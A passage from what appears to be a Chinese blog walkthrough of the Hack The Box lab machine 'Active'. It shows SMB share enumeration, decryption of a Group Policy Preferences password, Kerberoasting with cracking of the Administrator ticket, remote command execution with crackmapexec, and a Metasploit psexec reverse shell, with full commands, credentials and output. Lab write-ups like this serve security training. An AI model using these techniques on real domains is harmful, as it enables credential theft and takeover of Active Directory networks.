active.htb, Site: Default<span class="literal">-First</span><span class="literal">-Site</span><span class="literal">-Name</span>)</span><br><span class="line"><span class="number">445</span>/tcp   open  microsoft<span class="literal">-ds</span>?</span><br><span class="line"><span class="number">464</span>/tcp   open  tcpwrapped</span><br><span class="line"><span class="number">593</span>/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP <span class="number">1.0</span></span><br><span class="line"><span class="number">636</span>/tcp   open  tcpwrapped</span><br><span class="line"><span class="number">3268</span>/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default<span class="literal">-First</span><span class="literal">-Site</span><span class="literal">-Name</span>)</span><br><span class="line"><span class="number">3269</span>/tcp  open  tcpwrapped</span><br><span class="line"><span class="number">5722</span>/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">9389</span>/tcp  open  mc<span class="literal">-nmf</span>        .NET Message Framing</span><br><span class="line"><span class="number">47001</span>/tcp open  http          Microsoft HTTPAPI httpd <span class="number">2.0</span> (SSDP/UPnP)</span><br><span class="line">|_http<span class="literal">-server</span><span class="literal">-header</span>: Microsoft<span class="literal">-HTTPAPI</span>/<span class="number">2.0</span></span><br><span class="line">|_http<span class="literal">-title</span>: Not Found</span><br><span class="line"><span class="number">49152</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49153</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49154</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49155</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49157</span>/tcp open  ncacn_http    Microsoft Windows RPC over HTTP <span class="number">1.0</span></span><br><span class="line"><span class="number">49158</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49169</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49171</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49180</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_c<span class="built_in">lock-skew</span>: <span class="number">2</span>m57s</span><br><span class="line">| smb2<span class="literal">-security</span><span class="literal">-mode</span>:</span><br><span class="line">|   <span class="number">2.02</span>:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2<span class="literal">-time</span>:</span><br><span class="line">|   date: <span class="number">2020</span><span class="literal">-06</span><span class="literal">-27T14</span>:<span class="number">13</span>:<span class="number">29</span></span><br><span class="line">|_  start_date: <span class="number">2020</span><span class="literal">-06</span><span class="literal">-27T12</span>:<span class="number">57</span>:<span class="number">05</span></span><br></pre></td></tr></table></figure>

<p>用<code>enum4linux</code>工具扫描，发现 smb 服务是开着的，且有开放的共享目录</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># enum4linux -a 10.10.10.100</span></span><br><span class="line"></span><br><span class="line">=========================================</span><br><span class="line">| Share Enumeration on 10.10.10.100 |</span><br><span class="line">=========================================</span><br><span class="line">Use of uninitialized value \$global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.</span><br><span class="line"></span><br><span class="line"><span class="code">    Sharename       Type      Comment</span></span><br><span class="line"><span class="code">    ---------       ----      -------</span></span><br><span class="line"><span class="code">    ADMIN$          Disk      Remote Admin</span></span><br><span class="line"><span class="code">    C$              Disk      Default share</span></span><br><span class="line"><span class="code">    IPC$            IPC       Remote IPC</span></span><br><span class="line"><span class="code">    NETLOGON        Disk      Logon server share</span></span><br><span class="line"><span class="code">    Replication     Disk</span></span><br><span class="line"><span class="code">    SYSVOL          Disk      Logon server share</span></span><br><span class="line"><span class="code">    Users           Disk</span></span><br><span class="line"></span><br><span class="line">SMB1 disabled -- no workgroup available</span><br><span class="line">...</span><br><span class="line">[+] Attempting to map shares on 10.10.10.100</span><br><span class="line">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.</span><br><span class="line">//10.10.10.100/ADMIN$ Mapping: DENIED, Listing: N/A</span><br><span class="line"></span><br><span class="line">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.</span><br><span class="line">//10.10.10.100/C$ Mapping: DENIED, Listing: N/A</span><br><span class="line"></span><br><span class="line">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.</span><br><span class="line">//10.10.10.100/IPC$ Mapping: OK Listing: DENIED</span><br><span class="line"></span><br><span class="line">Use of uninitialized value \$global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.</span><br><span class="line">//10.10.10.100/NETLOGON Mapping: DENIED, Listing: N/A</span><br><span class="line"></span><br><span class="line">Use of uninitialized value \$global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.</span><br><span class="line">//10.10.10.100/Replication Mapping: OK, Listing: OK</span><br><span class="line"></span><br><span class="line">Use of uninitialized value \$global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.</span><br><span class="line">//10.10.10.100/SYSVOL Mapping: DENIED, Listing: N/A</span><br><span class="line"></span><br><span class="line">Use of uninitialized value \$global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.</span><br><span class="line">//10.10.10.100/Users Mapping: DENIED, Listing: N/A</span><br></pre></td></tr></table></figure>

<p>看看里面都有些啥文件</p>
<h1 id="smb-gt-group-xml"><a href="#smb-gt-group-xml" class="headerlink" title="smb -&gt; group.xml"></a>smb -&gt; group.xml</h1><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># smbmap -H 10.10.10.100</span></span><br><span class="line"></span><br><span class="line">[+] IP: 10.10.10.100:445 Name: 10.10.10.100  </span><br><span class="line"> Disk Permissions Comment</span><br><span class="line">---- ----------- -------</span><br><span class="line">ADMIN$             	NO ACCESS	Remote Admin</span><br><span class="line"><span class="code">	C$ NO ACCESS Default share</span></span><br><span class="line">IPC\$ NO ACCESS Remote IPC</span><br><span class="line">NETLOGON NO ACCESS Logon server share</span><br><span class="line">Replication READ ONLY</span><br><span class="line">SYSVOL NO ACCESS Logon server share</span><br><span class="line">Users NO ACCESS</span><br></pre></td></tr></table></figure>

<p>空密码登录上去，成了。（此处也可用这种方式来空密码      登录<code>smbclient //10.10.10.100/Replication -U %</code></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># smbclient -H //10.10.10.100/Replication -R -U ''</span></span><br><span class="line"></span><br><span class="line">handle<span class="emphasis">_name_</span>resolve_order: WARNING: Ignoring invalid list value '-U' for parameter 'name resolve order'</span><br><span class="line">Anonymous login successful</span><br><span class="line">Try "help" to get a list of possible commands.</span><br><span class="line">smb: \&gt;</span><br></pre></td></tr></table></figure>

<p>发现了个名为<code>cpassword</code>的敏感信息<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1593275741345-89a571a5-0b88-429d-959a-04f87555181f.png#align=left&display=inline&height=67&margin=%5Bobject%20Object%5D&name=group_xml.png&originHeight=172&originWidth=1912&size=76971&status=done&style=none&width=746" alt="group_xml.png"></p>
<h1 id="密码破解-gpp"><a href="#密码破解-gpp" class="headerlink" title="密码破解:gpp"></a>密码破解:gpp</h1><p>一番搜索得知，这个密码就是 windows 的密码，不过是用 AES 加了密的，可是微软官方<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN#endNote2" target="_blank" rel="noopener">在这里</a>提供了解密的密钥，导致可以获取原密码。理论支撑<a href="https://blog.compass-security.com/2012/04/exploit-credentials-stored-in-windows-group-policy-preferences/" target="_blank" rel="noopener">在这里</a>。<br>此处我们采用脚本<a href="https://github.com/leonteale/pentestpackage/blob/master/Gpprefdecrypt.py" target="_blank" rel="noopener">gpprefdecrypt.py</a>进行解密（当然用 kali 自带的<code>gpp-decrypt</code>也行</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># python Gpprefdecrypt.py 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'</span></span><br><span class="line"></span><br><span class="line"><span class="code">    GPPstillStandingStrong2k18</span></span><br></pre></td></tr></table></figure>

<p>至此，我们已经获得一组用户的帐号密码<code>SVC_TGS : GPPstillStandingStrong2k18</code>，域名称是<code>active.htb</code><br>由于靶机的 5985/5986 端口未开放，不能用 evil-rm 来验证。可以用 msf 里的<code>smb_login</code>模块，来验证这个凭据是否有效。<br>不过这里，我采用 smbclient 来登录到共享文件夹，从而获取<code>user.txt</code></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># smbclient //10.10.10.100/Users -U SVC_TGS%GPPstillStandingStrong2k18</span></span><br></pre></td></tr></table></figure>

<p>此外，还有一个 cme[<code>crackmapexec</code>]，作为 windows 域渗透时常用到的工具，也可以登录并执行命令（执行命令需 system 权限），如图<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1593357285845-a8a530b3-f6b1-4708-9d0a-9dbf5c1984c6.png#align=left&display=inline&height=587&margin=%5Bobject%20Object%5D&name=cme.png&originHeight=587&originWidth=1917&size=379101&status=done&style=none&width=1917" alt="cme.png"><br>登录</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># crackmapexec smb 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18</span></span><br><span class="line"></span><br><span class="line">SMB 10.10.10.100 445 DC [*] Windows 6.1 Build 7601 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB 10.10.10.100 445 DC [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18</span><br></pre></td></tr></table></figure>

<p>问题来了，怎么拿到 user 的 shell 呢<br>尝试使用 msf 的 windows/smb/psexec 模块，结果失败，原因是模块必须要管理员权限（下文有写到）</p>
<blockquote>
<p>This module uses a <strong>valid administrator username</strong> and password (or<br> password hash) to execute an arbitrary payload.</p>
</blockquote>
<p>一番操作无果，无奈寻找其它方式</p>
<h1 id="提权-Kerberoasting"><a href="#提权-Kerberoasting" class="headerlink" title="提权:Kerberoasting"></a>提权:Kerberoasting</h1><p>关于<code>Kerberoasting</code>的详细说明，三好学生师傅<a href="https://3gstudent.github.io/3gstudent.github.io/域渗透-Kerberoasting/" target="_blank" rel="noopener">在这里</a>已经说得很好了。简单来说，这种方式主要有如下几个要点：</p>
<ol>
<li>域内的主机都能查询 SPN。因此利用时可以考虑以下两种关系<ul>
<li>该 SPN 注册在域用户帐户(Users)下 =&gt; administrator 是默认的用户</li>
<li>域用户账户的权限很高     =&gt; administrator 权限当然很高</li>
</ul>
</li>
<li>域内的任何用户都可以向域内的任何服务请求 TGS    =&gt;    此处由<code>SVC_TGS</code>到<code>administrator</code></li>
<li>在 kerberos 认证过程的第 4 步中，用户将会收到由目标服务实例的 NTLM hash 加密生成的 TGS(service ticket)，加密算法为<code>RC4-HMAC</code>，有现成的爆破工具(hashcat)。有兴趣了解这种算法的师傅可以在<a href="https://tools.ietf.org/html/rfc4757" target="_blank" rel="noopener">rfc4757:RC4-HMAC</a>中找到更多信息。</li>
<li>当获得这个 TGS 后，我们可以使用密码字典，模拟加密过程，一次次生成 TGS 进行比较，来尝试穷举口令。</li>
</ol>
<p>同时，根据 att&amp;ck 框架的描述，这种攻击手法可以用以下几种方式来完成</p>
<blockquote>
<p>Kerberoasting, Technique T1208 - Enterprise | MITRE ATT&amp;CK®<br><a href="https://attack.mitre.org/techniques/T1208/" target="_blank" rel="noopener">https://attack.mitre.org/techniques/T1208/</a></p>
<table>
<thead>
<tr>
<th>Name</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td><a href="https://attack.mitre.org/software/S0363" target="_blank" rel="noopener"> Empire </a></td>
<td><a href="https://attack.mitre.org/software/S0363" target="_blank" rel="noopener">Empire</a> uses <a href="https://attack.mitre.org/software/S0194" target="_blank" rel="noopener">PowerSploit</a>‘s <code>Invoke-Kerberoast</code> to request service tickets and return crackable ticket hashes.<a href="https://github.com/PowerShellEmpire/Empire" target="_blank" rel="noopener">[10]</a></td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/software/S0357" target="_blank" rel="noopener"> Impacket </a></td>
<td><a href="https://attack.mitre.org/software/S0357" target="_blank" rel="noopener">Impacket</a> modules like GetUserSPNs can be used to get Service Principal Names (SPNs) for user accounts. The output is formatted to be compatible with cracking tools like John the Ripper and Hashcat.<a href="https://www.secureauth.com/labs/open-source-tools/impacket" target="_blank" rel="noopener">[9]</a></td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/software/S0194" target="_blank" rel="noopener"> PowerSploit </a></td>
<td><a href="https://attack.mitre.org/software/S0194" target="_blank" rel="noopener">PowerSploit</a>‘s <code>Invoke-Kerberoast</code> module can request service tickets and return crackable ticket hashes.<a href="https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/" target="_blank" rel="noopener">[8]</a><a href="https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/" target="_blank" rel="noopener">[5]</a></td>
</tr>
</tbody></table>
</blockquote>
<blockquote>
</blockquote>
<p>这里采用 impacket 套件的<code>GetUserSPNs</code>脚本，运行</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/SVC_TGS -request</span></span><br><span class="line"></span><br><span class="line">/usr/share/doc/python3-impacket/examples/GetUserSPNs.py:438: SyntaxWarning: "is" with a literal. Did you mean "=="?</span><br><span class="line">if userDomain is '':</span><br><span class="line">Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">ServicePrincipalName Name MemberOf PasswordLastSet LastLogon</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-19 03:06:40.351723 2018-07-31 01:17:40.656520</span><br><span class="line"></span><br><span class="line">$krb5tgs$23$<span class="emphasis">*Administrator$ACTIVE.HTB$active/CIFS~445*</span>$22e12dfea4b9454f2eb6bc1532ce33da\$71a6ca7735386847e09dba2becbc27c296c0cc3d5bf52d4a9ced6504fb07d4cfede8199a9eee2190c24f5033c2c34408dfbc6cbf857ae55681913eaae1c8cc05699beb165b6946483150410fff3cd7e817bf45ba99825b10b1e5a9965b1b2aff022b469de01e7d6a28ae728bf46a43da29e78133d0abdd3aa3da7059385d1a331047f730455d6153e391303436821a317d2c1fa610464f92e3a9374ba87520b44a00b8d01a0db658c91a46d611bd1b1ac14a2a99b6ad296e07a845c5eebda3e82e36075d4bea9ca98e9e6c1a375510ac53ff1d9334851370cbb25d3b2941231ef4ac08c76b5c6d733927a6664e5db73f8b6681a10e252ee99d07049fd2646969bb40b7cec54349ee024403a8112dc90b8d148d3cdbe19a8141a3b6724ba6107bc112aab92e9b7a6f4123566c425082e84e5937defec68499ddc827fb3298c9057cb919fff3436f28250d359a6d65e21094932a362e3ed163ed297566da663db3c629de4b15ee5a6041483b4d3c2d94546b46b0ff589fe86a83446a3290b157dc769716beff038a7cf1ec999c8d81b5bdcd92c2820c159c6c786efd0a592ddc4f70286b666e423f857aa39245a11cce82a4e586103af79c8f1c8922bcdb02e0ac367c21003c574b35b63094c2dd99f9cbec01bde35ec1629f30cb8a0d7fdb120065359fba1884b5b4010798f9b9f5f76a4f72fca8f8b9e1ce8e3b9d3ebc3913a655860f7da052f298369483b3e5a024fd264a44ee1af3b1b30f62f3443aa1d690c2f953d03937504d248cd93f01c0152873780de1063ed40f960e2fb285ba6c82a9e723bc513b69b07f48ef65e61bb98e066e78deded46e9c879384fc36f41997958a135611bc637f44a0a34fe31729da3d1a4dd3822d6a381844257befd36aaa677d80b8a617c7c1f6085d3a6fde8121ff458a12600088d73ccccd9cd343385163f0a1ad40d551062db8dedd4d0247b7ceca5d6871dbec589a91cd935840c307b51255687d240b83e2eafe9134f568e40639d3c386a4ebdb8ac716405d14163435d4297c5265a1a2904a4d3a2d241516aa5dc68b66f2bd88b20443aa5f40539b5403f1dc0cbdfb77e803a63dcd633f94be80bf7aa625322f30b4ae43489d965e844fb9fe074874b4d42607c452ad0cce4f7a7fd33079baebc973b0a5c6a23951753eec8eeb93dcc97f36fc1662f9fc51ef2be91a40ea8009d5cc76cfaaf756194a8c66e8e906db5fda9003b4cd673edd19012f2870c748b4e089</span><br><span class="line"></span><br><span class="line"><span class="section">## 参数说明</span></span><br><span class="line"></span><br><span class="line">-dc-ip 域控的 ip 地址，此处靶机就是域控</span><br><span class="line">active.htb/SVC_TGS 域名称+用户名</span><br><span class="line">-request 请求用户的 TGS，并且按照 JtR 或者/hashcat 能识别的格式打印出来（默认关闭）</span><br><span class="line">-outputfile 以 JtR/hashcat 的格式输出到文件中</span><br></pre></td></tr></table></figure>

<p>得到一串管理员的 hash，用 hashcat 解密</p>
<blockquote>
</blockquote>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force -o res.txt</span></span><br><span class="line"></span><br><span class="line"><span class="section"># cat res.txt</span></span><br><span class="line"></span><br><span class="line">...master1968(省略部分信息)</span><br></pre></td></tr></table></figure>

<p>登录 smb 即可获取 root.txt</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //<span class="number">10.10</span>.<span class="number">10.100</span>/Users <span class="literal">-U</span> active.htb\\SVC_TGS%GPPstillStandingStrong2k18</span><br></pre></td></tr></table></figure>

<p>或者用老外爱用的 cme（即 CrackMapExec）</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># crackmapexec smb 10.10.10.100 -u Administrator -p "Ticketmaster1968" --pass-pol</span></span><br><span class="line"></span><br><span class="line">//查看域内密码策略 --pass-pol  </span><br><span class="line">SMB 10.10.10.100 445 DC [*] Windows 6.1 Build 7601 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB 10.10.10.100 445 DC [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)</span><br><span class="line"></span><br><span class="line"><span class="section"># crackmapexec smb 10.10.10.100 -u Administrator -p "Ticketmaster1968" -x whoami</span></span><br><span class="line"></span><br><span class="line">//执行命令 -x</span><br><span class="line">SMB 10.10.10.100 445 DC [*] Windows 6.1 Build 7601 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB 10.10.10.100 445 DC [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)</span><br><span class="line">SMB 10.10.10.100 445 DC [+] Executed command</span><br><span class="line">SMB 10.10.10.100 445 DC active\administrator</span><br></pre></td></tr></table></figure>

<p>也可用 msf 里的 psexec 拿 shell，要求管理员权限</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">use windows/smb/psexec</span><br><span class="line"></span><br><span class="line">//输入帐号密码即可，例如</span><br><span class="line">//...</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">10.10</span>.<span class="number">16.122</span>:<span class="number">4444</span></span><br><span class="line">[*] <span class="number">10.10</span>.<span class="number">10.100</span>:<span class="number">445</span> - Connecting to the server...</span><br><span class="line">[*] <span class="number">10.10</span>.<span class="number">10.100</span>:<span class="number">445</span> - Authenticating to <span class="number">10.10</span>.<span class="number">10.100</span>:<span class="number">445</span> as user <span class="string">'Administrator'</span>...</span><br><span class="line">[*] <span class="number">10.10</span>.<span class="number">10.100</span>:<span class="number">445</span> - Selecting PowerShell target</span><br><span class="line">[*] <span class="number">10.10</span>.<span class="number">10.100</span>:<span class="number">445</span> - Executing the payload...</span><br><span class="line">[+] <span class="number">10.10</span>.<span class="number">10.100</span>:<span class="number">445</span> - Service start timed out, OK <span class="keyword">if</span> running a command or non<span class="literal">-service</span> executable...</span><br><span class="line">[*] Sending stage (<span class="number">176195</span> bytes) to <span class="number">10.10</span>.<span class="number">10.100</span></span><br><span class="line">[*] Meterpreter session <span class="number">1</span> opened (<span class="number">10.10</span>.<span class="number">16.122</span>:<span class="number">4444</span> -&gt; <span class="number">10.10</span>.<span class="number">10.100</span>:<span class="number">50831</span>) at <span class="number">2020</span><span class="literal">-06</span><span class="literal">-28</span> <span class="number">01</span>:<span class="number">59</span>:<span class="number">35</span> +<span class="number">0800</span></span><br></pre></td></tr></table></figure>

<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="在-smb-中批量下载文件的方法"><a href="#在-smb-中批量下载文件的方法" class="headerlink" title="在 smb 中批量下载文件的方法"></a>在 smb 中批量下载文件的方法</h2><p><a href="https://superuser.com/questions/856617/how-do-i-recursively-download-a-directory-using-smbclient" target="_blank" rel="noopener">原文链接</a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  smbclient <span class="string">'\\server\share'</span></span><br><span class="line">    mask <span class="string">""</span></span><br><span class="line">    recurse ON</span><br><span class="line">    prompt OFF</span><br><span class="line">    cd <span class="string">'path\to\remote\dir'</span></span><br><span class="line">    lcd <span class="string">'~/path/to/download/to/'</span></span><br><span class="line">    mget *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">smbclient <span class="string">'\\server\share'</span> <span class="literal">-N</span> <span class="literal">-c</span> <span class="string">'prompt OFF;recurse ON;cd '</span>path\to\directory\<span class="string">';lcd '</span>~/path/to/download/to/<span class="string">';mget *'</span></span><br></pre></td></tr></table></figure>

<h2 id="递归列出-smb-目录"><a href="#递归列出-smb-目录" class="headerlink" title="递归列出 smb 目录"></a>递归列出 smb 目录</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># smbmap -H 10.10.10.100 -R -u ''</span></span><br><span class="line"></span><br><span class="line">[+] IP: 10.10.10.100:445 Name: 10.10.10.100  </span><br><span class="line"> Disk Permissions Comment</span><br><span class="line">---- ----------- -------</span><br><span class="line">ADMIN$                                            	NO ACCESS	Remote Admin</span><br><span class="line"><span class="code">	C$ NO ACCESS Default share</span></span><br><span class="line">IPC\$ NO ACCESS Remote IPC</span><br><span class="line">NETLOGON NO ACCESS Logon server share</span><br><span class="line">Replication READ ONLY</span><br><span class="line">.\Replication\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 active.htb</span><br><span class="line">.\Replication\active.htb\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 DfsrPrivate</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 Policies</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 scripts</span><br><span class="line">.\Replication\active.htb\DfsrPrivate\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ConflictAndDeleted</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 Deleted</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 Installing</span><br><span class="line">.\Replication\active.htb\Policies\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 &#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 &#123;6AC1786C-016F-11D2-945F-00C04fB984F9&#125;</span><br><span class="line">.\Replication\active.htb\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">fr--r--r-- 23 Sat Jul 21 18:38:11 2018 GPT.INI</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 Group Policy</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 MACHINE</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 USER</span><br><span 